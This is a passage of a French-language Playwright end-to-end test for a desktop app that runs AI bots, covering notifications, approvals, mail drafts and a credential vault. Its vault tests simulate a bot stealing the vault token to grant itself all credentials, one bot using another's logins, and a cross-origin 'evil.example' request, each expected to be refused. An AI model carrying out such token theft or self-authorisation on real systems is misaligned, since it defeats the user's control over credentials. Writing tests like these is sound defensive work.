  await orionBox.fill('')
  await page.keyboard.press('Meta+f')
  await page.getByRole('textbox', { name: 'Texte à rechercher' }).waitFor({ timeout: 2_000 })
  await page.getByRole('button', { name: 'Fermer la recherche' }).click()

  // Media tab: what the bot sent, documents included, excluding code examples.
  await page.getByRole('tab', { name: 'Médias' }).click()
  await page.locator('.media-library .media-document').getByText('note.md').waitFor({ timeout: 3_000 })
  await page.locator('.media-library img.media-image').first().waitFor({ timeout: 3_000 })
  if (await page.locator('.media-library').getByText('exemple-de-syntaxe').count()) throw new Error('Un exemple de code est listé dans les médias.')
  await page.locator('.media-library .media-document').getByText('rapport.pdf').click()
  await page.locator('.rail-tab.is-active').getByText('rapport.pdf').waitFor({ timeout: 3_000 })
  await page.getByRole('button', { name: 'Fermer rapport.pdf' }).click()
  await page.getByRole('tab', { name: 'Routines' }).click()

  // Dark theme: same glass, control capture, then back to light. The theme is chosen in Settings only.
  if (await page.getByRole('button', { name: /Passer au thème/ }).count()) throw new Error('Le bouton de thème est encore dans la vue principale.')
  const chooseThemeInSettings = async (name) => {
    await page.getByRole('button', { name: 'Réglages', exact: true }).click()
    const dialog = page.getByRole('dialog', { name: 'Réglages' })
    await dialog.getByRole('radio', { name }).click()
    await dialog.press('Escape')
    await dialog.waitFor({ state: 'detached', timeout: 3_000 })
  }
  await chooseThemeInSettings('Sombre')
  await page.waitForFunction(() => document.documentElement.dataset.theme === 'dark')
  await delay(400)
  await page.screenshot({ path: `${SCREENSHOTS}glass-dark.png` })
  await chooseThemeInSettings('Clair')
  await page.waitForFunction(() => document.documentElement.dataset.theme === 'light')

  // Background turn of an already open bot: "Au travail" right away, then "Terminé".
  for (const client of wss.clients) send(client, event('chat-nova', 'message.start', { turn_id: 'turn-fond' }))
  await page.locator('[data-bot=nova] .bot-row-status.is-working').waitFor({ timeout: 3_000 })
  await page.locator('.working-strip.has-work').getByText('1 au travail').waitFor({ timeout: 3_000 })
  const notificationsBefore = (await notificationsSent()).length
  for (const client of wss.clients) send(client, event('chat-nova', 'message.complete', { turn_id: 'turn-fond', text: 'Travail de fond terminé.', status: 'complete' }))
  await page.locator('[data-bot=nova] .bot-row-status.is-done').waitFor({ timeout: 3_000 })
  // A bot whose chat is not open: one macOS notification, its name as title.
  const novaDone = (await notificationsSent()).slice(notificationsBefore)
  if (novaDone.length !== 1 || novaDone[0].tag !== 'hermesbot-nova' || novaDone[0].body !== 'Travail de fond terminé.') throw new Error(`Notification de fin de tour : seulement le message du bot, ${JSON.stringify(novaDone)}`)
  // A turn started by another bot's message is between bots: done, but no notification. Same for a silent turn.
  for (const [turn, start, reply] of [['turn-entre-bots', 'Message from 🤖 Orion (@orion): relis le plan', 'Plan relu, OK.'], ['turn-silence', 'Fais le point.', '[SILENT]']]) {
    const sentBefore = (await notificationsSent()).length
    for (const client of wss.clients) send(client, event('chat-nova', 'message.start', { turn_id: turn, text: start }))
    await page.locator('[data-bot=nova] .bot-row-status.is-working').waitFor({ timeout: 3_000 })
    for (const client of wss.clients) send(client, event('chat-nova', 'message.complete', { turn_id: turn, text: reply, status: 'complete' }))
    await page.locator('[data-bot=nova] .bot-row-status.is-done, [data-bot=nova] .bot-row-status.is-idle').first().waitFor({ timeout: 3_000 })
    await delay(300)
    const sent = (await notificationsSent()).slice(sentBefore)
    if (sent.length) throw new Error(`Pas de notification pour ${turn} : ${JSON.stringify(sent)}`)
  }

  // Work summary: visible on the row of a background bot, with no unread before the turn ends.
  const novaBadge = page.locator('[data-bot=nova] .unread-badge')
  const unreadOf = async () => Number((await novaBadge.count()) ? await novaBadge.innerText() : 0)
  const unreadBeforeWork = await unreadOf()
  // Like the real gateway during this turn: otherwise the turn polling (6 s) reports it done before the summary (4 s).
  liveStatusByProfile.nova = 'working'
  for (const client of wss.clients) {
    send(client, event('chat-nova', 'message.start', { turn_id: 'turn-resume' }))
    send(client, event('chat-nova', 'todo.updated', { revision: 1, todos: [{ id: '1', content: 'Relire le plan', status: 'completed' }, { id: '2', content: 'Écrire le résumé', status: 'in_progress' }] }))
  }
  await page.locator('[data-bot=nova] .bot-row-work').getByText('2/2 · Écrire le résumé').waitFor({ timeout: 7_000 })
  if (await unreadOf() !== unreadBeforeWork) throw new Error('Un non-lu est apparu pendant le travail.')
  delete liveStatusByProfile.nova
  for (const client of wss.clients) send(client, event('chat-nova', 'message.complete', { turn_id: 'turn-resume', text: 'Résumé écrit.', status: 'complete' }))
  await page.locator('[data-bot=nova] .bot-row-status.is-done').waitFor({ timeout: 3_000 })
  if (await unreadOf() !== unreadBeforeWork + 1) throw new Error('La fin du tour doit compter un seul non-lu.')

  // On the open bot: a step in the header and the panel, never a terminal command.
  for (const client of wss.clients) {
    send(client, event('chat-orion', 'message.start', { turn_id: 'turn-etape' }))
    send(client, event('chat-orion', 'tool.start', { tool_id: 'a', name: 'read_file', context: '/tmp/dossier/plan.md' }))
  }
  await page.locator('.work-card').getByText('Lit plan.md').waitFor({ timeout: 7_000 })
  await page.locator('.chat-status-detail').getByText('Lit plan.md').waitFor({ timeout: 2_000 })
  for (const client of wss.clients) send(client, event('chat-orion', 'tool.start', { tool_id: 'b', name: 'terminal', context: 'curl -H "Authorization: Bearer secret-test"' }))
  await page.locator('.work-card').getByText('Lance une commande').waitFor({ timeout: 7_000 })
  if (await page.getByText('secret-test').count()) throw new Error('La commande d’un terminal est affichée.')
  // The open bot's turn ends while the window is in the background: notified like any other bot.
  await page.evaluate(() => { window.__hasFocus = document.hasFocus; document.hasFocus = () => false })
  const sentBeforeOpenDone = (await notificationsSent()).length
  for (const client of wss.clients) send(client, event('chat-orion', 'message.complete', { turn_id: 'turn-etape', text: 'Étape terminée.', status: 'complete' }))
  await page.locator('.work-card').waitFor({ state: 'detached', timeout: 3_000 })
  const openDone = (await notificationsSent()).slice(sentBeforeOpenDone)
  await page.evaluate(() => { document.hasFocus = window.__hasFocus })
  if (openDone.length !== 1 || openDone[0].tag !== 'hermesbot-orion' || openDone[0].body !== 'Étape terminée.') throw new Error(`Fin de tour du bot ouvert, fenêtre en arrière-plan : ${JSON.stringify(openDone)}`)

  // Vault and approvals: the gateway asks, the app answers with the same id, nothing secret remains.
  if (capabilityCalls === 0) throw new Error('client.capabilities n’a pas été annoncé.')
  const sheet = page.locator('.request-sheet')
  const ask = (id, method, params = {}) => { for (const client of wss.clients) send(client, { jsonrpc: '2.0', id, method, params: { session_id: 'chat-orion', ...params } }) }
  const answerOf = async (id) => {
    for (let attempt = 0; attempt < 40 && !clientResponses.has(id); attempt += 1) await delay(50)
    if (!clientResponses.has(id)) throw new Error(`Pas de réponse à ${id}.`)
    return clientResponses.get(id)
  }
  ask('srq-login', 'vault.save_login', { origin: 'https://exemple.test', site: 'exemple.test' })
  await sheet.getByText('https://exemple.test').waitFor({ timeout: 3_000 })
  await sheet.getByText('Orion a besoin de tes identifiants').waitFor()
  await page.getByLabel('Identifiant du site').fill('moi@exemple.test')
  await page.getByLabel('Mot de passe du site').fill('mot-de-passe-test')
  await delay(350)
  await page.screenshot({ path: `${SCREENSHOTS}vault-login.png` })
  await sheet.getByRole('button', { name: 'Enregistrer et continuer' }).click()
  const login = JSON.parse((await answerOf('srq-login')).result.value)
  if (login.identifier !== 'moi@exemple.test' || login.password !== 'mot-de-passe-test') throw new Error('Réponse du coffre incorrecte.')
  await sheet.waitFor({ state: 'detached', timeout: 2_000 })
  if (await page.getByText('mot-de-passe-test').count()) throw new Error('Le mot de passe est resté affiché.')
  if (await page.evaluate(() => JSON.stringify({ ...localStorage, ...sessionStorage }).includes('mot-de-passe-test'))) throw new Error('Le mot de passe a été stocké dans le navigateur.')
  ask('srq-code', 'vault.code', { site: 'exemple.test', hint: 'Code reçu par SMS' })
  await sheet.getByText('Code reçu par SMS').waitFor({ timeout: 3_000 })
  await sheet.getByRole('button', { name: 'Passer' }).click()
  if ((await answerOf('srq-code')).result.value !== '') throw new Error('Passer doit répondre une valeur vide.')
  ask('srq-unlock', 'vault.unlock_prompt', { backend: 'gestionnaire', display_name: 'Gestionnaire' })
  await sheet.getByText('Déverrouiller Gestionnaire').waitFor({ timeout: 3_000 })
  for (const client of wss.clients) send(client, event('chat-orion', 'request.cancel', { id: 'srq-unlock', method: 'vault.unlock_prompt', reason: 'timeout' }))
  await sheet.waitFor({ state: 'detached', timeout: 3_000 })
  ask('srq-ok', 'approval', { request_id: 'r1', command: 'commande de test', description: 'Action à valider', choices: ['once', 'session', 'deny'] })
  await sheet.getByText('commande de test').waitFor({ timeout: 3_000 })
  await sheet.getByRole('button', { name: 'Autoriser une fois' }).click()
  if ((await answerOf('srq-ok')).result.choice !== 'once') throw new Error('Choix d’accord incorrect.')
  await sheet.waitFor({ state: 'detached', timeout: 2_000 })
  ask('srq-non-gere', 'clarify', { question: 'Question ?' })
  if ((await answerOf('srq-non-gere')).error?.code !== -32601) throw new Error('Une demande non gérée doit être refusée tout de suite.')
  ask('srq-fenetre', 'terminal.read')
  if ((await answerOf('srq-fenetre')).error?.code !== 4404) throw new Error('Une demande de fenêtre doit répondre 4404.')
  // A request left open comes back when the session resumes.
  openRequests = [{ id: 'srq-reprise', method: 'vault.code', params: { session_id: 'chat-nova', site: 'reprise.test' } }]
  await page.locator('[data-bot=nova]').click()
  await sheet.getByText('Code de vérification pour reprise.test').waitFor({ timeout: 5_000 })
  openRequests = []
  await sheet.getByLabel('Code', { exact: true }).fill('123456')
  await sheet.getByRole('button', { name: 'Valider' }).click()
  if ((await answerOf('srq-reprise')).result.value !== '123456') throw new Error('Code de reprise incorrect.')
  await sheet.waitFor({ state: 'detached', timeout: 2_000 })
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 3_000 })

  // CDP vault: bots API on 4333, local window on 4332, gateway never the recipient.
  const vaultCall = async (action) => {
    const response = await fetch(`http://127.0.0.1:4333/v1/${action}`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'orion', target: 'onglet-steam' }),
      signal: AbortSignal.timeout(10_000),
    })
    const raw = await response.text()
    return { httpStatus: response.status, body: JSON.parse(raw), raw }
  }
  if ((await fetch('http://127.0.0.1:4332/api/browser-vault/events')).status !== 401) throw new Error('Les demandes du coffre sont lisibles sans session.')
  const missingTarget = await fetch('http://127.0.0.1:4333/v1/save', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'orion' }),
  })
  if (missingTarget.status !== 400 || (await missingTarget.json()).error !== 'target_required') throw new Error('Un appel sans targetId doit être refusé.')
  const savingBrowser = vaultCall('save')
  const browserSheet = page.locator('.browser-vault-dialog')
  await browserSheet.getByText('https://store.steampowered.com', { exact: true }).waitFor({ timeout: 3_000 })
  await browserSheet.getByText('Orion a besoin de tes identifiants').waitFor()
  await browserSheet.getByLabel('Identifiant du site').fill('steam-test')
  await browserSheet.getByLabel('Mot de passe du site').fill(BROWSER_SECRET)
  await browserSheet.getByRole('button', { name: 'Enregistrer et continuer' }).click()
  const savedBrowser = await savingBrowser
  if (savedBrowser.httpStatus !== 200 || savedBrowser.body.status !== 'saved') throw new Error(`Enregistrement CDP refusé: ${savedBrowser.raw}`)
  if (savedBrowser.raw.includes(BROWSER_SECRET)) throw new Error('Le secret CDP est renvoyé au bot après save.')
  await browserSheet.waitFor({ state: 'detached', timeout: 2_000 })
  const listedBrowser = await vaultCall('list')
  if (listedBrowser.body.entries?.[0]?.identifier !== 'steam-test' || listedBrowser.raw.includes(BROWSER_SECRET)) throw new Error('list du coffre CDP incorrect.')
  // Stored in the keychain (disposable here), reserved for the bot that asked for it.
  const keychainDump = await execFileAsync('/usr/bin/security', ['dump-keychain', BROWSER_VAULT_KEYCHAIN])
  if (!keychainDump.stdout.includes('HermesBot') || !keychainDump.stdout.includes('"crtr"<uint32>="HBot"') || keychainDump.stdout.includes(BROWSER_SECRET)) throw new Error('Identifiant absent du trousseau.')
  const otherBot = await fetch('http://127.0.0.1:4333/v1/fill', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'nova', target: 'onglet-steam' }),
  })
  if (otherBot.status !== 403 || (await otherBot.json()).error !== 'bot_not_allowed') throw new Error('Un autre bot utilise un identifiant qui ne lui est pas réservé.')
  const otherList = await fetch('http://127.0.0.1:4333/v1/list', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'nova' }),
  })
  if ((await otherList.json()).entries?.length !== 0) throw new Error('Un bot voit les identifiants réservés à un autre.')
  // A bot cannot authorize itself through the app API: token required, file in 0600.
  const selfGrant = (headers) => fetch('http://127.0.0.1:4333/admin/v1/entries', {
    method: 'POST', headers: { 'Content-Type': 'application/json', ...headers },
    body: JSON.stringify({ origin: 'https://store.steampowered.com', identifier: 'steam-test', bots: ['*'] }),
  })
  for (const headers of [{}, { Authorization: 'Bearer faux' }, { Authorization: `Bearer ${'0'.repeat(64)}` }]) {
    const refused = await selfGrant(headers)
    if (refused.status !== 403 || (await refused.json()).error !== 'admin_forbidden') throw new Error('API d’administration du coffre ouverte sans jeton.')
  }
  if ((await fetch('http://127.0.0.1:4333/admin/v1/entries')).status !== 403) throw new Error('Liste d’administration lisible sans jeton.')
  // Even with the token (readable by a bot of the same account), a write requires the user's Hermes session.
  const stolenToken = { Authorization: `Bearer ${readFileSync(BROWSER_VAULT_TOKEN, 'utf8').trim()}` }
  for (const headers of [stolenToken, { ...stolenToken, 'X-Hermes-Cookie': 'hermes_session=faux' }]) {
    const refused = await selfGrant(headers)
    if (refused.status !== 403 || (await refused.json()).error !== 'user_session_required') throw new Error('Écriture du coffre acceptée sans session Hermes.')
  }
  if ((await fetch('http://127.0.0.1:4333/admin/v1/entries', { headers: stolenToken })).status !== 200) throw new Error('Lecture des métadonnées refusée avec le jeton.')
  if (((await import('node:fs')).statSync(BROWSER_VAULT_TOKEN).mode & 0o777) !== 0o600) throw new Error('Jeton du coffre lisible par d’autres comptes.')
  const cliListed = await execFileAsync(process.execPath, ['scripts/browser-vault.mjs', 'list', '--bot', 'orion'], {
    cwd: new URL('..', import.meta.url), env: { ...process.env, HERMESBOT_VAULT_PORT: '4333' },
  })
  if (JSON.parse(cliListed.stdout).entries?.[0]?.identifier !== 'steam-test' || cliListed.stdout.includes(BROWSER_SECRET)) throw new Error('CLI du coffre CDP incorrect.')
  const cliFilled = await execFileAsync(process.execPath, ['scripts/browser-vault.mjs', 'fill', '--bot', 'orion', '--target', 'onglet-steam'], {
    cwd: new URL('..', import.meta.url), env: { ...process.env, HERMESBOT_VAULT_PORT: '4333' },
  })
  if (JSON.parse(cliFilled.stdout).status !== 'filled' || cdpInjections.at(-1).target !== 'onglet-steam') throw new Error('CLI fill ne respecte pas le targetId.')

  // Simulated reload: only the CDP arguments carry the secret, never the evaluated JavaScript.
  cdpUrl = 'https://store.steampowered.com/login/?reloaded=1'
  const filledBrowser = await vaultCall('fill')
  if (filledBrowser.httpStatus !== 200 || filledBrowser.body.fields?.join() !== 'identifier,password') throw new Error(`Remplissage CDP refusé: ${filledBrowser.raw}`)
  const loginInjection = cdpInjections.at(-1)
  if (loginInjection.target !== 'onglet-steam') throw new Error('Injection dans le premier onglet au lieu du targetId demandé.')
  if (loginInjection.values.join() !== `steam-test,${BROWSER_SECRET}`) throw new Error('Les champs CDP ne reçoivent pas les identifiants.')
  if (cdpExpressions.some((expression) => expression.includes(BROWSER_SECRET))) throw new Error('Secret interpolé dans Runtime.evaluate.')
  if (filledBrowser.raw.includes(BROWSER_SECRET)) throw new Error('Le secret CDP est renvoyé au bot après fill.')

  const injectionsBeforeRefusal = cdpInjections.length
  cdpUrl = 'https://example.com/login'
  const refusedBrowser = await vaultCall('fill')
  if (refusedBrowser.httpStatus !== 404 || refusedBrowser.body.error !== 'origin_not_found') throw new Error('Origine différente non refusée.')
  if (cdpInjections.length !== injectionsBeforeRefusal) throw new Error('Injection sur une origine différente.')
  const crossOrigin = await fetch('http://127.0.0.1:4333/v1/fill', {
    method: 'POST', headers: { 'Content-Type': 'application/json', Origin: 'https://evil.example' }, body: JSON.stringify({ bot: 'orion' }),
  })
  if (crossOrigin.status !== 403) throw new Error('Une page web peut appeler le service des bots.')

  cdpUrl = 'https://store.steampowered.com/login/?code=1'
  const codingBrowser = vaultCall('code')
  await browserSheet.getByLabel('Code de vérification').fill(BROWSER_CODE)
  await browserSheet.getByRole('button', { name: 'Injecter le code' }).click()
  const codedBrowser = await codingBrowser
  if (codedBrowser.httpStatus !== 200 || codedBrowser.body.fields?.[0] !== 'code') throw new Error(`Code CDP refusé: ${codedBrowser.raw}`)
  if (cdpInjections.at(-1).target !== 'onglet-steam' || cdpInjections.at(-1).values[0] !== BROWSER_CODE || codedBrowser.raw.includes(BROWSER_CODE)) throw new Error('Circuit du code CDP incorrect.')

  const cancellingBrowser = vaultCall('save')
  await browserSheet.getByRole('button', { name: 'Plus tard' }).waitFor({ timeout: 3_000 })
  await browserSheet.getByRole('button', { name: 'Plus tard' }).click()
  if ((await cancellingBrowser).body.status !== 'cancelled') throw new Error('Annulation du coffre CDP incorrecte.')

  // Settings > Vault: the identifier shows without a password, Nova is authorized in addition to Orion.
  await page.keyboard.press('Meta+,')
  await page.locator('.settings-nav').getByRole('button', { name: 'Coffre' }).click()
  const vaultEntry = page.locator('.vault-entry').filter({ hasText: 'store.steampowered.com' })
  await vaultEntry.getByText('steam-test · Orion').waitFor({ timeout: 5_000 })
  if (await page.locator('.settings').getByText(BROWSER_SECRET).count()) throw new Error('Mot de passe visible dans les réglages.')
  await vaultEntry.getByRole('button', { name: 'Modifier' }).click()
  await page.locator('.vault-bot').filter({ hasText: 'Nova' }).locator('input').check()
  await page.locator('.vault-form').getByRole('button', { name: 'Enregistrer' }).click()
  await vaultEntry.getByText('steam-test · Nova, Orion').waitFor({ timeout: 5_000 })
  await page.screenshot({ path: `${SCREENSHOTS}vault-settings.png` })
  const allowedFill = await fetch('http://127.0.0.1:4333/v1/fill', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot: 'nova', target: 'onglet-steam' }),
  })
  if (allowedFill.status !== 200 || cdpInjections.at(-1).values.join() !== `steam-test,${BROWSER_SECRET}`) throw new Error('Mot de passe perdu après le changement de bots.')
  // Direct add from the settings, then removal.
  await page.locator('.vault-tools').getByRole('button', { name: 'Ajouter un identifiant' }).click()
  await page.locator('.vault-form').getByLabel('Site').fill('https://exemple.com/connexion')
  await page.locator('.vault-form').getByLabel('Identifiant').fill('ajout-test')
  await page.locator('.vault-form').getByLabel('Mot de passe').fill('mot-de-passe-ajout')
  await page.locator('.vault-bot.is-all input').check()
  await page.locator('.vault-form').getByRole('button', { name: 'Enregistrer' }).click()
  const addedEntry = page.locator('.vault-entry').filter({ hasText: 'exemple.com' })
  await addedEntry.getByText('ajout-test · Tous les bots').waitFor({ timeout: 5_000 })
  page.once('dialog', (dialog) => dialog.accept())
  await addedEntry.getByRole('button', { name: 'Retirer' }).click()
  await addedEntry.waitFor({ state: 'detached', timeout: 5_000 })
  await page.getByRole('button', { name: 'Fermer les réglages' }).click()
  await page.locator('.settings-backdrop').waitFor({ state: 'detached', timeout: 3_000 })

  const browserAudit = readFileSync(BROWSER_VAULT_AUDIT, 'utf8')
  if (browserAudit.includes(BROWSER_SECRET) || browserAudit.includes(BROWSER_CODE)) throw new Error('Secret dans le journal du coffre.')
  if (serverLog.includes(BROWSER_SECRET) || serverLog.includes(BROWSER_CODE)) throw new Error('Secret dans les logs du serveur.')
  if (JSON.stringify([...clientResponses.values()]).includes(BROWSER_SECRET) || JSON.stringify([...clientResponses.values()]).includes(BROWSER_CODE)) throw new Error('Secret CDP passé par la gateway.')
  if (await page.getByText(BROWSER_SECRET).count() || await page.evaluate((secret) => JSON.stringify({ ...localStorage, ...sessionStorage }).includes(secret), BROWSER_SECRET)) throw new Error('Secret CDP conservé dans le navigateur.')

  // Mail card: edited by hand, what is sent to the bot carries what was approved and its digest.
  const askMail = async (id) => {
    await page.getByRole('textbox', { name: 'Message à Orion' }).fill(`Test mail ${id}`)
    await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  }
  await askMail('m1')
  await page.locator('.working-caption').getByText('Brouillon de mail en cours').waitFor({ timeout: 3_000 })
  if (await page.locator('.messages-column').getByText('Draft-Id').count()) throw new Error('Le bloc de mail brut est visible.')
  const card = page.locator('.mail-card')
  await card.waitFor({ timeout: 5_000 })
  if (await page.locator('.messages-column').getByText('hermes-mail').count()) throw new Error('Le bloc de mail brut est visible.')
  await card.getByLabel('À', { exact: true }).fill('faux')
  if (await card.getByRole('button', { name: 'Envoyer' }).isEnabled()) throw new Error('Envoi possible avec une adresse invalide.')
  await card.getByLabel('À', { exact: true }).fill('autre@exemple.test')
  await card.getByLabel('Corps du mail').fill('Bonjour,\n\nTexte corrigé.')
  await delay(300)
  await card.scrollIntoViewIfNeeded()
  await page.screenshot({ path: `${SCREENSHOTS}mail-card.png` })
  const promptsBeforeMail = promptCalls
  // An approved mail goes out even if the composer is in PLAN: the "send nothing" instruction must not follow it.
  await page.getByRole('radio', { name: 'PLAN', exact: true }).click()
  await card.getByRole('button', { name: 'Envoyer' }).click()
  for (let attempt = 0; attempt < 40 && promptCalls === promptsBeforeMail; attempt += 1) await delay(50)
  if (promptCalls !== promptsBeforeMail + 1) throw new Error('Un clic sur Envoyer doit lancer un seul tour.')
  if (lastApiText !== undefined) throw new Error('Un mail validé ne doit pas porter la consigne du mode.')
  await page.getByRole('radio', { name: 'EXEC', exact: true }).click()
  const digest = createHash('sha256').update('Bot <bot@exemple.test>\n77\nautre@exemple.test\n\nRe: Votre demande\nBonjour,\n\nTexte corrigé.').digest('hex')
  for (const expected of ['````hermes-mail-approved', 'Id: m1', 'Draft-Id: 77', 'To: autre@exemple.test', 'Texte corrigé.', `Approved-Digest: ${digest}`]) {
    if (!lastPromptText.includes(expected)) throw new Error(`Mail approuvé sans « ${expected} ».`)
  }
  await card.waitFor({ state: 'detached', timeout: 3_000 })
  await page.locator('.message-assistant .mail-note').getByText('Mail approuvé : Re: Votre demande').waitFor({ timeout: 2_000 })
  await page.locator('.message-user .mail-note').getByText('Re: Votre demande, à autre@exemple.test').waitFor({ timeout: 2_000 })
  await delay(500) // the simulated turn ends: the next send would be ignored while it runs
  // Ignore: no turn started, choice kept after the thread reloads.
  await askMail('m2')
  await card.waitFor({ timeout: 5_000 })
  const promptsBeforeDiscard = promptCalls
  await card.getByRole('button', { name: 'Ignorer' }).click()
  await page.locator('.mail-note.is-muted').getByText('Brouillon écarté').waitFor({ timeout: 2_000 })
  if (promptCalls !== promptsBeforeDiscard) throw new Error('Ignorer ne doit lancer aucun tour.')
  if (await page.locator('[data-bot=orion] .bot-row-preview').getByText('hermes-mail').count()) throw new Error('Le roster montre le bloc brut.')

  // Open questions: one field per question, only the filled ones go back, in one turn.
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test questions')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  const questions = page.locator('.questions-card')
  await questions.waitFor({ timeout: 5_000 })
  if (await questions.locator('textarea').count() !== 3) throw new Error('Il faut un champ par question.')
  if (await questions.getByRole('button', { name: 'Envoyer les réponses' }).isEnabled()) throw new Error('Envoi possible sans réponse.')
  await questions.getByLabel('Avec quoi le client est-il reparti au bout des 5 jours ?').fill('Un plan sur 90 jours.')
  await questions.getByLabel('Le bloc dirigeants reste-t-il au tutoiement ?').fill('Oui.')
  await delay(500)
  await questions.scrollIntoViewIfNeeded()
  await page.screenshot({ path: `${SCREENSHOTS}questions-card.png` })
  const promptsBeforeAnswers = promptCalls
  await questions.getByRole('button', { name: 'Envoyer les réponses' }).click()
  for (let attempt = 0; attempt < 40 && promptCalls === promptsBeforeAnswers; attempt += 1) await delay(50)
  if (promptCalls !== promptsBeforeAnswers + 1) throw new Error('Envoyer les réponses doit lancer un seul tour.')
  for (const expected of ['Mes réponses à tes questions :', '1. Avec quoi le client', '   Un plan sur 90 jours.', '3. Le bloc dirigeants', '   Oui.']) {
    if (!lastPromptText.includes(expected)) throw new Error(`Réponses sans « ${expected} ».`)
  }
  if (lastPromptText.includes('seule personne')) throw new Error('Une question vide est partie.')
  await page.locator('.mail-note').getByText('2 réponses envoyées').waitFor({ timeout: 3_000 })
  await delay(500)

  // Questions without a dedicated heading, in the latest reply: a form too; a plain Markdown reply once something follows.
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test questions libres')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await questions.waitFor({ timeout: 5_000 })
  if (await questions.locator('textarea').count() !== 3) throw new Error('Il faut un champ par question, même sans titre « Questions ouvertes ».')
  await questions.getByRole('heading').or(questions.locator('header')).first().getByText('Tes réponses avant de lancer').waitFor({ timeout: 2_000 })
  await page.locator('.message-assistant').filter({ hasText: 'Je lance dès que j’ai tout.' }).waitFor({ timeout: 2_000 })
  await questions.getByLabel('Carbon : on garde l’article ou on le retire ?').fill('On le retire.')
  await questions.getByLabel('Tu veux voir la carte sur stage toi-même, ou mon contrôle suffit ?').fill('Ton contrôle suffit.')
  const promptsBeforeFree = promptCalls
  await questions.getByRole('button', { name: 'Envoyer les réponses' }).click()
  for (let attempt = 0; attempt < 40 && promptCalls === promptsBeforeFree; attempt += 1) await delay(50)
  if (promptCalls !== promptsBeforeFree + 1) throw new Error('Envoyer les réponses libres doit lancer un seul tour.')
  for (const expected of ['Mes réponses à tes questions :', '2. Carbon : on garde l’article ou on le retire ?', '   On le retire.', '3. Tu veux voir la carte', '   Ton contrôle suffit.']) {
    if (!lastPromptText.includes(expected)) throw new Error(`Réponses libres sans « ${expected} ».`)
  }
  if (lastPromptText.includes('repli en cascade')) throw new Error('Une question vide est partie.')
  // Nothing follows the bot's questions any more: the older reply is plain Markdown again, nothing lost.
  await page.locator('.questions-card').waitFor({ state: 'detached', timeout: 3_000 })
  await page.locator('.message-assistant').getByText('Carbon : on garde l’article ou on le retire ?').waitFor({ timeout: 2_000 })
  await page.locator('.message-user').filter({ hasText: 'On le retire.' }).waitFor({ timeout: 2_000 })
  await delay(800)

  // Links in a bot message open in a new page: a Markdown link and a bare URL.
  await page.context().route('https://example.com/**', (route) => route.fulfill({ contentType: 'text/html', body: '<title>ok</title>ok' }))
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test liens')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  const linkMessage = page.locator('.message-assistant').filter({ hasText: 'pour la suite.' })
  await linkMessage.waitFor({ timeout: 5_000 })
  for (const [name, url] of [['le lien Markdown', 'https://example.com/md'], ['https://example.com/bare', 'https://example.com/bare']]) {
    const popup = page.context().waitForEvent('page', { timeout: 5_000 })
    await linkMessage.getByRole('link', { name }).click()
    const opened = await popup
    await opened.waitForLoadState('domcontentloaded').catch(() => {})
    if (opened.url() !== url) throw new Error(`Le lien « ${name} » ouvre ${opened.url()} au lieu de ${url}.`)
    await opened.close()
  }
  await delay(300)

  // Search in the conversation: Enter goes to the most recent match, then older ones, with a position counter.
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test recherche')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.locator('.message-assistant').filter({ hasText: 'en capitales' }).waitFor({ timeout: 5_000 })
  await delay(800)
  await page.getByRole('button', { name: 'Rechercher dans la conversation' }).click()
  const searchInput = page.getByRole('textbox', { name: 'Texte à rechercher' })
  await searchInput.fill('zephyr')
  await page.locator('.chat-search-count').getByText('3 résultats').waitFor({ timeout: 2_000 })
  const highlightState = () => page.evaluate(() => {
    const current = CSS.highlights.get('search-current')
    const range = current && [...current][0]
    const view = document.querySelector('.messages-scroll').getBoundingClientRect()
    if (!range) return { hits: CSS.highlights.get('search-hit')?.size ?? 0, current: false }
    const box = range.getBoundingClientRect()
    return { hits: CSS.highlights.get('search-hit')?.size ?? 0, current: true, visible: box.top >= view.top && box.bottom <= view.bottom, top: Math.round(box.top), text: range.toString() }
  })
  const before = await highlightState()
  if (before.hits !== 3 || before.current) throw new Error(`Les 3 occurrences doivent être surlignées avant Entrée : ${JSON.stringify(before)}`)
  if (await page.locator('.message').count() < 10) throw new Error('La recherche ne doit plus filtrer la conversation.')
  await searchInput.press('Enter')
  await page.locator('.chat-search-count').getByText('3 / 3').waitFor({ timeout: 2_000 })
  const first = await highlightState()
  if (!first.current || !first.visible || first.text !== 'ZÉPHYR') throw new Error(`Entrée doit amener à la dernière occurrence, visible : ${JSON.stringify(first)}`)
  await searchInput.press('Enter')
  await page.locator('.chat-search-count').getByText('2 / 3').waitFor({ timeout: 2_000 })
  const second = await highlightState()
  if (!second.visible || second.text !== 'zephyr') throw new Error(`Entrée suivant doit aller à l’occurrence précédente : ${JSON.stringify(second)}`)
  await searchInput.press('Enter')
  await searchInput.press('Enter')
  await page.locator('.chat-search-count').getByText('3 / 3').waitFor({ timeout: 2_000 })
  await searchInput.press('Shift+Enter')
  await page.locator('.chat-search-count').getByText('1 / 3').waitFor({ timeout: 2_000 })
  const wrapped = await highlightState()
  if (!wrapped.visible || wrapped.text !== 'Zéphyr') throw new Error(`Maj+Entrée doit boucler vers la première : ${JSON.stringify(wrapped)}`)
  await searchInput.fill('introuvable-xyz')
  await page.locator('.chat-search-count').getByText('Aucun résultat').waitFor({ timeout: 2_000 })
  await searchInput.fill('zephyr')
  await searchInput.press('Escape')
  await page.locator('.chat-search-bar').waitFor({ state: 'detached', timeout: 2_000 })
  if (await page.evaluate(() => CSS.highlights.has('search-hit') || CSS.highlights.has('search-current'))) throw new Error('Fermer la recherche doit retirer les surlignages.')
  await page.locator('.messages-scroll').evaluate((element) => { element.scrollTop = element.scrollHeight })
  await delay(300)

